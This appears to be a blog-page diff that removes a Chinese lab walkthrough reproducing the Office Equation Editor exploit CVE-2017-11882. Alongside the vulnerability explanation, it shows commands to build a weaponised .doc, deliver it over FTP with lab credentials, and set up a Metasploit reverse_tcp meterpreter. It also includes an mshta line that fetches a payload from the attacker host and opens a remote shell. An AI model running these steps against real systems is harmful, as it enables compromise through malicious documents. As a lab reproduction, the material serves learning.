-      <a class="article-title" href="/2017/12/01/Office远程代码执行漏洞（CVE-2017-11882）/">Office远程代码执行漏洞（CVE-2017-11882）</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-meta">
-      
-	<a href="/2017/12/01/Office远程代码执行漏洞（CVE-2017-11882）/" class="article-date">
-	  <time datetime="2017-12-01T09:52:08.000Z" itemprop="datePublished">2017-12-01</time>
-	</a>
-
-      
-      
-    </div>
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="Office远程代码执行漏洞（CVE-2017-11882）"><a href="#Office远程代码执行漏洞（CVE-2017-11882）" class="headerlink" title="Office远程代码执行漏洞（CVE-2017-11882）"></a>Office远程代码执行漏洞（CVE-2017-11882）</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>&emsp;&emsp;2017年11月14日微软公司披露潜伏达<strong>17年之久</strong>的office远程代码执行漏洞（CVE-2017-11882）。CVE-2017-11882允许攻击者在当前用户的上下文中运行任意代码，导致无法正确处理内存中的对象，即为“ Microsoft Office Memory Corruption Vulnerability “，<strong>栈溢出的远程执行漏洞</strong>。</p>
-<p>​    该漏洞是在EQNEDT32.EXE组件的缓冲区溢出导致。当受害用户打开Office文档时就有可能被漏洞利用，危害极大。 原因是由于EQNEDT32.EXE进程读入包含MathType的ole数据。函数给Font Name数据分配的大小是0x24个字节，超过大小会造成栈缓冲区溢出。而程序在拷贝公式Font Name数据时没有对其长度进行校验，从而导致漏洞发生。</p>
-<p>通杀以下<strong>没有更新</strong>的Office版本：</p>
-<p>Microsoft Office 2000</p>
-<p>Microsoft Office 2003</p>
-<p>Microsoft Office 2007 Service Pack 3</p>
-<p>Microsoft Office 2010 Service Pack 2</p>
-<p>Microsoft Office 2013 Service Pack 1</p>
-<p>Microsoft Office 2016</p>
-<p>MicrosoftOffice 365</p>
-<p>具体漏洞分析内容详见以下链接：<br><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11882" target="_blank" rel="noopener">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11882</a></p>
-<p><a href="https://embedi.com/blog/skeleton-closet-ms-office-vulnerability-you-didnt-know-about/" target="_blank" rel="noopener">https://embedi.com/blog/skeleton-closet-ms-office-vulnerability-you-didnt-know-about/</a></p>
-<p><a href="https://cert.360.cn/warning/detail?id=5373beff9f40ba6de88eb04c3b7c2455" target="_blank" rel="noopener">https://cert.360.cn/warning/detail?id=5373beff9f40ba6de88eb04c3b7c2455</a></p>
-<p><a href="https://www.anquanke.com/post/id/87311" target="_blank" rel="noopener">https://www.anquanke.com/post/id/87311</a></p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="第一步-漏洞验证"><a href="#第一步-漏洞验证" class="headerlink" title="第一步 漏洞验证"></a>第一步 漏洞验证</h3><p>&emsp;&emsp;登录kali攻击机，进入用户home文件中的CVE-2017-1182-payload目录。</p>
-<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180727/b8icLIKf9B.png?imageslim" alt="mark"></p>
-<p>执行以下命令生成payload-cale.doc文件，为漏洞payload（漏洞利用程序），弹出计算机程序验证漏洞是否存在。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python CVE-2017-11882.py -c &quot;cmd.exe /c calc.exe&quot; -o payload-cale.doc</span><br></pre></td></tr></table></figure></p>
-<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180727/KlKHk314gI.png?imageslim" alt="mark"></p>
-<p>接下来要把payload-cale.doc文件上传到windows靶机，受害者打开doc文件，漏洞执行利用。</p>
-<p>登录windows靶机，打开FTP服务器。直接payload-cale.doc文件上传到此靶机上，真实环境下可利用社会工程学。</p>
-<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180727/b8Le52ee2g.png?imageslim" alt="mark"></p>
-<p>打开FTP服务器。</p>
-<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180727/8ELED7HHmd.png?imageslim" alt="mark"></p>
-<p>在kali攻击机登录ftp。输入账号密码。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.168.0.40  [靶机IP地址]</span><br><span class="line">college   college@root</span><br></pre></td></tr></table></figure>
-<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180727/FajJL8475F.png?imageslim" alt="mark"></p>
-<p>上传到靶机上，上传目录是桌面。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">put payload-cale.doc</span><br></pre></td></tr></table></figure>
-<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180727/2AdIEE1BbF.png?imageslim" alt="mark"></p>
-<p>成功上传到靶机桌面上。</p>
-<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180727/3IGCFGijBH.png?imageslim" alt="mark"></p>
-<p>点击payload-cale.doc文件可看到执行计算机弹窗效果，实验验证成功，说明靶机存在此漏洞。</p>
-<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180727/feieClHfEe.png?imageslim" alt="mark"></p>
-<h3 id="第二步-漏洞利用"><a href="#第二步-漏洞利用" class="headerlink" title="第二步 漏洞利用"></a>第二步 漏洞利用</h3><p>在kali攻击机上启动msf  。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
-<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180727/fa84298f6f.png?imageslim" alt="mark"></p>
-<p>查找CVE-2017-11882 漏洞(攻击机已经集成攻击程序)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search CVE-2017-11882</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/CVE-2017-11882</span><br></pre></td></tr></table></figure>
-<p>设置payload为反弹tcp </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set payload windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>
-<p>查看所需选项</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure>
-<p>设置本机地址</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set lhost 192.168.0.23 [kali操作机地址]</span><br></pre></td></tr></table></figure>
-<p>设置uri的路径<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set URIPATH payload</span><br></pre></td></tr></table></figure></p>
-<p>运行payload,启动利用后，msf会监听本机8080端口，靶机访问192.168.0.23:8080/payload.doc，打开doc触发就会得到反弹到4444端口的tcp会话中</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit -j</span><br></pre></td></tr></table></figure>
-<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180727/Ce4E70D3l6.png?imageslim" alt="mark"></p>
-<p>在/home/college/CVE-2017-11882-payload目录下中执行以下命令：生成 payload.doc </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python CVE-2017-11882.py -c &quot;mshta http://192.168.0.11[kali操作机地址]:8080 /payload&quot; -o payload.doc</span><br></pre></td></tr></table></figure>
-<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180727/dFKk1Lf8fJ.png?imageslim" alt="mark"></p>
-<p>同样通过ftp上传到桌面上，再点击执行 payload.doc 。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.168.0.40  [靶机IP地址]</span><br><span class="line">college   college@root</span><br><span class="line">put payload.doc</span><br></pre></td></tr></table></figure>
-<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180727/KFADlLaIHD.png?imageslim" alt="mark"></p>
-<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180727/J2aAl6El0j.png?imageslim" alt="mark"></p>
-<h3 id="第三步-后渗透阶段"><a href="#第三步-后渗透阶段" class="headerlink" title="第三步 后渗透阶段"></a>第三步 后渗透阶段</h3><p>可以看到成功反弹shell，session 1 进入meterpreter终端中。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session 1</span><br></pre></td></tr></table></figure>
-<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180727/9dDGmEj004.png?imageslim" alt="mark"></p>
-<p>查看系统信息，如下。进一步可以使用meterpreter进行后渗透攻击。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysinfo</span><br></pre></td></tr></table></figure>
-<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180727/7fj8f6GElC.png?imageslim" alt="mark"></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞复现/">漏洞复现</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-<!-- Table of Contents -->
-
-  
 
 
   <nav id="page-nav">
     
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/">下一页 &raquo;</a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/2/">下一页 &raquo;</a>
   </nav>
 
 </section>
